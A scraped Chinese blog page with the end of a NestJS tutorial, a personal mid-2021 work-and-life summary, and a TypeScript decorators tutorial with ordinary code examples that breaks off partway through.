<p>最后浏览器访问url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3000/students/who-are-you</span><br><span class="line">// =&gt; Im student  ✅</span><br></pre></td></tr></table></figure></p>
<p>这样模块添加完成了</p>
<p>如果你看到了这里，说明你真的对 NestJS 很感兴趣。<a href="/nestJs/nest-js-tutorial-2/" title="下章">下章</a>将会对接口再深入细化。</p>
<p>完整示例可以在 <a href="https://github.com/gdccwxx/nest-test" target="_blank" rel="noopener">github</a> 找到</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/随笔/2021-middle-summary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/随笔/2021-middle-summary/" itemprop="url">算是 2021 的年中总结</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-09-10T23:10:30+08:00">
                2021-09-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天是9月平常的周五，可是对我来说有一点点不一样，晚上10点终于把负责5个月的项目发出去了。那是我4月中到现在做的项目，虽然已经发了几版，但今天是我最后一次负责发布它。下周就要开始负责新的项目了。</p>
<p>我有些疲惫的到了家门口，下意识拿出了裤子口袋的钥匙，然后插进了钥匙孔，熟练的旋转了2圈。进门后看了看手表，已经22:25了，还有5分钟就要上外教课。然后有些急促的跑到阳台，收拾已经良好的衣服，再把衣服叠进衣柜。</p>
<p>看了看时间，还有3分钟。我立马冲进厕所洗了把脸，希望清醒一些，也希望给外教留个好印象。</p>
<p>课程开始了，又是熟悉的自我介绍环节，再嘘寒问暖了一番。从聊天中得知外教是南非人，比我们晚6个小时，而且在南半球，现在是冬天。我表示吃惊，她也看了看时间，夸我有毅力。在一顿欢声笑语中结束了。</p>
<p>我拿着洗好的衣服和毛巾，进入厕所的那一刻，一天的重担仿佛才卸下来，这段时间的重担仿佛才卸下来。</p>
<h2 id="项目咋样"><a href="#项目咋样" class="headerlink" title="项目咋样"></a>项目咋样</h2><p>这算是我在团队负责最久的项目之一，历时5个半月。这算是一次完整版的中台项目，完全由 Typescript 搭建。包括 React 做前端、Nest js 做后台、Nginx 做转发、Docker 做容的完整中台，几乎所有的架构代码都是我搭建的。它包括 数据库做存储、log4js 做日志、权限控制、配置发布、单元测试等等，几乎是完整的后台了。它的作用是负责运营配置相关，包括升级、增量升级、配置下发、邮件模版等功能。</p>
<p>搭建的再好，也都交给其他同学负责了。人总是要成长，作为前端工程师也得做点纯前端的事情。但是总有些舍不得。谁忍心把自己一手抚养长大的 baby 给其他人照顾？更何况是我带着好几个同学打造出来的“杰作”？（至少对我来说是杰作！）</p>
<p>不管咋样，好好休息一番，再加油搞事吧！</p>
<h2 id="生活呢"><a href="#生活呢" class="headerlink" title="生活呢"></a>生活呢</h2><p>生活是发生了翻天覆地的变化。和我健身的好友相继离开了腾讯，一个归蜀，一个拥抱羊城了。说实话，他们离开深圳时，我真的有些动摇了。要不要离开深圳，要不要离开公司，成了我前两个月问自己最多的问题。好在我留下来了，生活也给我了些惊喜。</p>
<p><strong>再次上镜！！</strong><br>(贴两张帅照嘻嘻. 视频号 腾讯CSIG “我在鹅厂做To B” 第5期)<br><img src="/随笔/2021-middle-summary/me-with-my-girl.jpg" alt="withMyGirl"><br><img src="/随笔/2021-middle-summary/me.jpg" alt="me"></p>
<p>看到很多人评论，其中有很多好兄弟好朋友们。好兄弟、我崇拜的学长、总监、高中老师等等都为我转发加油，内心也十分的自豪，被认可的感觉真好。</p>
<p>与此同时，我也开始写一些文章。虽然效果一般般，阅读的人不多，但是每当我探究多深入一次，我感觉自己的基础知识更加牢固。也让我有更多的动力写文章了。</p>
<h2 id="说说兴趣吧"><a href="#说说兴趣吧" class="headerlink" title="说说兴趣吧"></a>说说兴趣吧</h2><p>自拔牙前后，体重从 142 -&gt; 134 -&gt; 140。从瘦了一圈又回来。我的兴趣也经历了一次过山车。</p>
<p>很久没有打羽毛球的我，再次拿起了羽毛球拍；知道好友要离开时，疯狂约健身。然后就是一个多月没动弹。因为拔牙后，啥也不想干，啥也不能干。之后又疯狂反噬，着了魔一样健身。</p>
<p>最近的兴趣爱好是看源码和看书。我把node都拉下准备好好看看，顺便提提pr；也迷上了一本书叫《沉思录》。</p>
<p>第一次听说 斯多葛学派 是在得到上，每天早上都会听一节课。听完之后发现正是我一直追求的心态与品质，一边看书一边练习了起来。真别说，效果特别好，因为刚练股票就长起来了哈哈哈。内心窃喜之外，也告诉自己那就接着练习吧。</p>
<p>兴趣基本上就这些了</p>
<h2 id="说说接下来的规划吧"><a href="#说说接下来的规划吧" class="headerlink" title="说说接下来的规划吧"></a>说说接下来的规划吧</h2><p>首先是准备好好写文章。多沉淀沉淀自己，学习新技术，吸收好能力。希望年底前写完10篇文章吧</p>
<p>然后是英语，12月份马上就一年了。也结束了外教课，希望再总结总结</p>
<p>再是健身，晚饭前抽时间健身吧，保持保持身材，不然走形了嘻嘻</p>
<p>最后是生活，希望10月份去趟东北，八字的一撇先保住咯，略略略～</p>
<p>最后也祝阅读到这里的你，心想事成，万事如意！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/typescript/best-practice-of-decorator/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/typescript/best-practice-of-decorator/" itemprop="url">Decorator 这么好用，赶紧用起来！</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-09-05T20:22:01+08:00">
                2021-09-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>你是不是因入参和结果的日志而苦恼？是不是为运行时的数据检查而难受？是不是为鉴权函数而郁闷？使用 decorator 后，能让代码更优雅，编程更快捷。</p>
<h3 id="啥是-Decorator"><a href="#啥是-Decorator" class="headerlink" title="啥是 Decorator?"></a>啥是 Decorator?</h3><p>Decorator 是 ES6 中的提案之一，它实际上是个 wrapper，可以为类、属性或函数提供额外功能。举个🌰：<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">key: <span class="built_in">string</span></span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"evaluate: "</span>, key);</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"call: "</span>, key);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@f</span>(<span class="string">"Class Decorator"</span>)</span><br><span class="line"><span class="keyword">class</span> A &#123;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params"><span class="meta">@f</span>(<span class="string">"Constructor Parameter"</span>) foo</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@f</span>(<span class="string">"Instance Method"</span>) <span class="comment">// 1</span></span><br><span class="line">  method(<span class="meta">@f</span>(<span class="string">"Instance Method Parameter"</span>) foo) &#123;&#125; <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">  <span class="meta">@f</span>(<span class="string">"Instance Property"</span>)</span><br><span class="line">  prop?: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本上，装饰器会的行为就是下面这样：</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@f</span>()</span><br><span class="line"><span class="keyword">class</span> A</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">A = f(A) || A</span><br></pre></td></tr></table></figure></p>
<h2 id="使用前的准备"><a href="#使用前的准备" class="headerlink" title="使用前的准备"></a>使用前的准备</h2><p>虽然 Decorator 只是一个提案，但可通过工具来使用它：</p>
<h3 id="Babel"><a href="#Babel" class="headerlink" title="Babel:"></a>Babel:</h3><blockquote>
<p>babel-plugin-syntax-decorators<br>babel-plugin-transform-decorators-legacy</p>
</blockquote>
<h3 id="Typescript"><a href="#Typescript" class="headerlink" title="Typescript:"></a>Typescript:</h3><p>命令行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tsc --target ES5 --experimentalDecorators</span><br></pre></td></tr></table></figure></p>
<p>tsconfig.json:<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"compilerOptions"</span>: &#123;</span><br><span class="line">    <span class="attr">"target"</span>: <span class="string">"ES5"</span>,</span><br><span class="line">    <span class="attr">"experimentalDecorators"</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h2><p>不同类型的装饰器执行顺序是明确的：<br>1、 实例成员：参数装饰器 -&gt; 方法/访问器/属性 装饰器<br>2、 静态成员：参数装饰器 -&gt; 方法/访问器/属性 装饰器<br>3、 构造函数：参数装饰器<br>4、 类装饰器<br>例如：</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">key: <span class="built_in">string</span></span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"evaluate: "</span>, key);</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"call: "</span>, key);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@f</span>(<span class="string">"Class Decorator"</span>)</span><br><span class="line"><span class="keyword">class</span> A &#123;</span><br><span class="line">  <span class="meta">@f</span>(<span class="string">"Static Property"</span>)</span><br><span class="line">  <span class="keyword">static</span> prop?: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@f</span>(<span class="string">"Static Method"</span>)</span><br><span class="line">  <span class="keyword">static</span> method(<span class="meta">@f</span>(<span class="string">"Static Method Parameter"</span>) foo) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params"><span class="meta">@f</span>(<span class="string">"Constructor Parameter"</span>) foo</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@f</span>(<span class="string">"Instance Method"</span>)</span><br><span class="line">  method(<span class="meta">@f</span>(<span class="string">"Instance Method Parameter"</span>) foo) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@f</span>(<span class="string">"Instance Property"</span>)</span><br><span class="line">  prop?: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行顺序</span></span><br><span class="line">evaluate:  Instance Method</span><br><span class="line">evaluate:  Instance Method Parameter</span><br><span class="line">call:  Instance Method Parameter</span><br><span class="line">call:  Instance Method</span><br><span class="line">evaluate:  Instance Property</span><br><span class="line">call:  Instance Property</span><br><span class="line">evaluate:  Static Property</span><br><span class="line">call:  Static Property</span><br><span class="line">evaluate:  Static Method</span><br><span class="line">evaluate:  Static Method Parameter</span><br><span class="line">call:  Static Method Parameter</span><br><span class="line">call:  Static Method</span><br><span class="line">evaluate:  Class Decorator</span><br><span class="line">evaluate:  Constructor Parameter</span><br><span class="line">call:  Constructor Parameter</span><br><span class="line">call:  Class Decorator</span><br></pre></td></tr></table></figure>
<p>然而，在同一方法中的不同参数构造器顺序是相反的，最后参数回的装饰器会先被执行：<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">key: <span class="built_in">string</span></span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"evaluate: "</span>, key);</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"call: "</span>, key);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> B &#123;</span><br><span class="line">  <span class="meta">@f</span>(<span class="string">'first'</span>)</span><br><span class="line">  <span class="meta">@f</span>(<span class="string">'second'</span>)</span><br><span class="line">  method() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行顺序</span></span><br><span class="line">evaluate:  first</span><br><span class="line">evaluate:  second</span><br><span class="line">call:  second</span><br><span class="line">call:  first</span><br></pre></td></tr></table></figure></p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><img src="/typescript/best-practice-of-decorator/xmind.png" alt="decorators"></p>
<h3 id="类装饰器"><a href="#类装饰器" class="headerlink" title="类装饰器"></a>类装饰器</h3><p>📌 参数：</p>
<ul>
<li><code>target</code>: 类的 <code>构造器（constructor）</code></li>
</ul>
<p>⬅️ 返回值: undefined | 替代原有构造器</p>
<p>因此，类装饰器适合用于继承一个现有类并添加一些属性和方法。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rewirteClassConstructor</span>&lt;<span class="title">T</span> <span class="title">extends</span> </span>&#123; <span class="keyword">new</span> (...args: <span class="built_in">any</span>[]): &#123;&#125; &#125;&gt;(<span class="keyword">constructor</span>: T) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">class</span> <span class="keyword">extends</span> <span class="keyword">constructor</span> &#123;</span><br><span class="line">    words = <span class="string">"rewrite constructor"</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@rewirteClassConstructor</span></span><br><span class="line"><span class="keyword">class</span> Speak &#123;</span><br><span class="line">  words: <span class="built_in">string</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params">t: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.words = t;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> say = <span class="keyword">new</span> Speak(<span class="string">"hello world"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(say.words) <span class="comment">// rewrite constructor</span></span><br></pre></td></tr></table></figure></p>
<h3 id="属性装饰器"><a href="#属性装饰器" class="headerlink" title="属性装饰器"></a>属性装饰器</h3><p>📌 参数: </p>
<ul>
<li><code>target</code>: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链</li>
<li><code>propertyKey</code>: 属性名称</li>
</ul>
<p>⬅️ 返回值: 返回的结果将被忽略</p>
<p>除了用于收集信息外，属性装饰器也可以用来给类添加额外的方法和属性。 例如我们可以写一个装饰器来给某些属性添加监听器。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"reflect-metadata"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">capitalizeFirstLetter</span>(<span class="params">str: <span class="built_in">string</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.charAt(<span class="number">0</span>).toUpperCase() + str.slice(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">observable</span>(<span class="params">target: <span class="built_in">any</span>, key: <span class="built_in">string</span></span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="comment">// prop -&gt; onPropChange</span></span><br><span class="line">  <span class="keyword">const</span> targetKey = <span class="string">"on"</span> + capitalizeFirstLetter(key) + <span class="string">"Change"</span>;</span><br><span class="line"></span><br><span class="line">  target[targetKey] = <span class="function"><span class="keyword">function</span> (<span class="params">fn: (prev: <span class="built_in">any</span>, next: <span class="built_in">any</span>) =&gt; <span class="built_in">void</span></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">let</span> prev = <span class="keyword">this</span>[key];</span><br><span class="line">      <span class="comment">// tsconfig.json target to ES6</span></span><br><span class="line">      Reflect.defineProperty(<span class="keyword">this</span>, key, &#123;</span><br><span class="line">        <span class="keyword">set</span>(next) &#123;</span><br><span class="line">          fn(prev, next);</span><br><span class="line">          prev = next;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> C &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@observable</span></span><br><span class="line">  foo = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  onFooChange(arg0: <span class="function">(<span class="params">prev: <span class="built_in">any</span>, next: <span class="built_in">any</span></span>) =&gt;</span> <span class="built_in">void</span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> c = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line">c.onFooChange(<span class="function">(<span class="params">prev, next</span>) =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`prev: <span class="subst">$&#123;prev&#125;</span>, next: <span class="subst">$&#123;next&#125;</span>`</span>))</span><br><span class="line"></span><br><span class="line">c.foo = <span class="number">100</span>; <span class="comment">// -&gt; prev: -1, next: 100</span></span><br><span class="line">c.foo = <span class="number">-3.14</span>; <span class="comment">// -&gt; prev: 100, next: -3.14</span></span><br></pre></td></tr></table></figure></p>
<h3 id="方法装饰器"><a href="#方法装饰器" class="headerlink" title="方法装饰器"></a>方法装饰器</h3><p>📌 参数：</p>
<ul>
<li><code>target</code>: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链</li>
<li><code>propertyKey</code>: 属性名称</li>
<li><code>descriptor</code>: 属性的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor" target="_blank" rel="noopener">描述器</a></li>
</ul>
<p>⬅️ 返回值：undefined | 替代属性的描述器。</p>
<p>方法装饰器<code>descriptor</code>的key为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">value</span><br><span class="line">writable</span><br><span class="line">enumerable</span><br><span class="line">configurable</span><br></pre></td></tr></table></figure></p>
<p>通过这个参数我们可以修改方法原本的实现，添加一些共用逻辑。 例如我们可以给一些方法添加打印输入与输出的能力:<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logger</span>(<span class="params">target: <span class="built_in">any</span>, propertyKey: <span class="built_in">string</span>, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> original = descriptor.value;</span><br><span class="line"></span><br><span class="line">  descriptor.value = <span class="function"><span class="keyword">function</span> (<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'params: '</span>, ...args);</span><br><span class="line">    <span class="keyword">const</span> result = original.call(<span class="keyword">this</span>, ...args);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'result: '</span>, result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> C &#123;</span><br><span class="line">  <span class="meta">@logger</span></span><br><span class="line">  add(x: <span class="built_in">number</span>, y:<span class="built_in">number</span> ) &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> c = <span class="keyword">new</span> C();</span><br><span class="line">c.add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// -&gt; params: 1, 2</span></span><br><span class="line"><span class="comment">// -&gt; result: 3</span></span><br></pre></td></tr></table></figure></p>
<h3 id="访问器装饰器"><a href="#访问器装饰器" class="headerlink" title="访问器装饰器"></a>访问器装饰器</h3><p>📌 参数：</p>
<ul>
<li><code>target</code>: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链</li>
<li><code>propertyKey</code>: 属性名称</li>
<li><code>descriptor</code>: 属性的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor" target="_blank" rel="noopener">描述器</a></li>
</ul>
<p>⬅️ 返回值：undefined | 替代属性的描述器。</p>
<p>访问器装饰器<code>descriptor</code>的key为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get</span><br><span class="line">set</span><br><span class="line">enumerable</span><br><span class="line">configurable</span><br></pre></td></tr></table></figure></p>
<p>访问器装饰器总体上讲和方法装饰器很接近，唯一的区别在于描述器中有的key不同例如，我们可以将某个属性设为不可变值：<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">immutable</span>(<span class="params">target: <span class="built_in">any</span>, propertyKey: <span class="built_in">string</span>, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> original = descriptor.set;</span><br><span class="line"></span><br><span class="line">  descriptor.set = <span class="function"><span class="keyword">function</span> (<span class="params">value: <span class="built_in">any</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> original.call(<span class="keyword">this</span>, &#123; ...value &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> C &#123;</span><br><span class="line">  <span class="keyword">private</span> _point = &#123; x: <span class="number">0</span>, y: <span class="number">0</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@immutable</span></span><br><span class="line">  <span class="keyword">set</span> point(value: &#123; x: <span class="built_in">number</span>, y: <span class="built_in">number</span> &#125;) &#123;</span><br><span class="line">    <span class="keyword">this</span>._point = value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">get</span> point() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._point;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> c = <span class="keyword">new</span> C();</span><br><span class="line"><span class="keyword">const</span> point = &#123; x: <span class="number">1</span>, y: <span class="number">1</span> &#125;</span><br><span class="line">c.point = point;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(c.point === point)</span><br><span class="line"><span class="comment">// -&gt; false</span></span><br></pre></td></tr></table></figure></p>
<h3 id="参数装饰器"><a href="#参数装饰器" class="headerlink" title="参数装饰器"></a>参数装饰器</h3><p>📌 参数：</p>
<ul>
<li><code>target</code>: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链</li>
<li><code>propertyKey</code>: 属性的名称(注意是方法的名称，而不是参数的名称)</li>
<li><code>paramerterIndex</code>: 参数在方法中所处的位置的下标</li>
</ul>
<p>⬅️ 返回值：返回的值将会被忽略。</p>
